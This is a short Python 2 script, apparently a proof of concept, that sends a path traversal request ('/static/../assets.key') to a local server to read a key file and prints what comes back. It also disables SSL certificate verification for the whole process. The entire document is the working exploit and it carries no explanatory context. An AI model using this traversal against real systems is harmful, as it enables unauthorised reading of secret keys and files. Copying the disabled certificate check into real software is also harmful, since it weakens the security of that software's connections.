import urllib
import urllib2

import ssl
ssl._create_default_https_context = ssl._create_unverified_context

url = "http://localhost:8233/static/../assets.key"

req = urllib2.Request(url)

res_data = urllib2.urlopen(req)
res = res_data.read()
print res